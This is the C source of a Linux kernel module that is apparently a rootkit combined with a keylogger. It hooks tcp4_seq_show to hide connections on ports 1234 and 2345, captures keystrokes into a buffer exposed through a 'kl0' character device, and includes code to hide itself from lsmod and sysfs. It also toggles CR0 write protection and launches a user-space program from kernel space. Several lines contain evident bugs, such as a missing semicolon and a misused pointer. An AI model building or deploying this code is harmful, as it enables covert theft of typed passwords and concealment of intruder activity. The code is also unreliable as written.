#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"

#ifdef HIDE_MODULE
#include <linux/list.h>
#include <linux/kobject.h>
static struct list_head *prev_module;
static struct kobject *prev_kobj;
static short hidden = 0;
#endif

MODULE_DESCRIPTION("");
MODULE_AUTHOR("");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "kl0"
unsigned major;

static int target_pid = 0;
static char* target_process = "/home/vagrant/test"

#ifndef BUFLEN
#define BUFLEN 1024
#endif
static char input_buf[BUFLEN];
unsigned buf_count = 0;
#ifdef KEY_LOG
static int kl_notifier_call(struct notifier_block *, unsigned long, void *);
static ssize_t kl_device_read(struct file *, char __user *, size_t, loff_t *);

static struct notifier_block kl_notifier_block = { .notifier_call =
							   kl_notifier_call };

static struct file_operations fops = { .read = kl_device_read };
#endif

static unsigned long * __force_order;

/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port_in = htons(1234);
	unsigned short port_out = htons(2345);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port_in == is->inet_sport || port_in == is->inet_dport || port_out == is->inet_sport || port_out == is->inet_dport) {
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

#ifdef KEY_LOG
static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
			    void *data)
{
	struct keyboard_notifier_param *param = data;
	char c = param->value;

	if (!param->down || action != KBD_KEYSYM) {
		/* user not pressing key or event is not KBD_KEYSYM */
		return NOTIFY_DONE;
	}

	if (c == 0x01) {
		input_buf[buf_count++] = 0x0a;
	} else if (c >= 0x20 && c < 0x7f) {
		input_buf[buf_count++] = c;
	}

	if (buf_count >= BUFLEN) {
		buf_count = 0;
		memset(input_buf, 0, BUFLEN);
	}

	return NOTIFY_OK;
}

static ssize_t kl_device_read(struct file *fp, char __user *buf, size_t len,
			      loff_t *offset)
{
	size_t buflen = strlen(input_buf);
	int ret;

	ret = copy_to_user(buf, input_buf, buflen);
	if (ret) {
		printk(KERN_ERR
		       "keylog: Unable to copy from kernel buffer to user space buffer\n");
		return -ret;
	}

	memset(input_buf, 0, BUFLEN);
	buf_count = 0;

	return buflen;
}
#endif

#ifdef HIDE_MODULE
/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
	hidden=0;
    list_add(&THIS_MODULE->list, prev_module);
	kobject_add(prev_kobj);
	list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj.entry);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
	hidden=1;
    prev_module = THIS_MODULE->list.prev;
	prev_kobj = &THIS_MODULE->mkobj.kobj;
    list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}
#endif

inline void cr0_write(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    cr0_write(cr0);
}

static inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    cr0_write(cr0);
}

static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static void check_process(char* comm, int pid) {
	if (strcmp(comm, target_process) == 0){
		target_pid = pid;
	}
	pr_info("%s [%d]\n", comm, pid);
}

static int get_pid(struct subprocess_info *info, struct cred *new) {
	struct task_struct *task;

    for_each_process(task)
        check_process(task->comm, task->pid);
}

static int spawnProcess(char* path) {

        int rc;
char* argv[] = {path, NULL};
static char* envp[] = {
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	rc = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
	printk("RC is: %i \n", rc);
	return rc;
}

static int __init kl_init(void)
{
	int i;
	int err;
	#ifdef KEY_LOG
	int ret;
	ret = register_chrdev(0, DEVICE_NAME, &fops);
	if (ret < 0) {
		printk(KERN_ERR
		       "keylog: Unable to register character device\n");
		return ret;
	}
	major = ret;
	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
	#endif
	protect_memory();
	#ifdef KEY_LOG
	ret = register_keyboard_notifier(&kl_notifier_block);
	#endif
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;
	unprotect_memory();
	#ifdef KEY_LOG
	if (ret) {
		printk(KERN_ERR
		       "keylog: Unable to register keyboard notifier\n");
		return -ret;
	}
	#endif
	i = spawnProcess(target_process);
    printk(KERN_INFO "keylog: return value %d\n",i);

	memset(input_buf, 0, BUFLEN);

#ifdef HIDE_MODULE
	/* Hide myself from lsmod and /proc/modules :) */
	// hideme();
#endif

	return 0;
}

static void __exit kl_exit(void)
{
	protect_memory();
	#ifdef KEY_LOG
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&kl_notifier_block);
	#endif
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	unprotect_memory();
}

module_init(kl_init);
module_exit(kl_exit);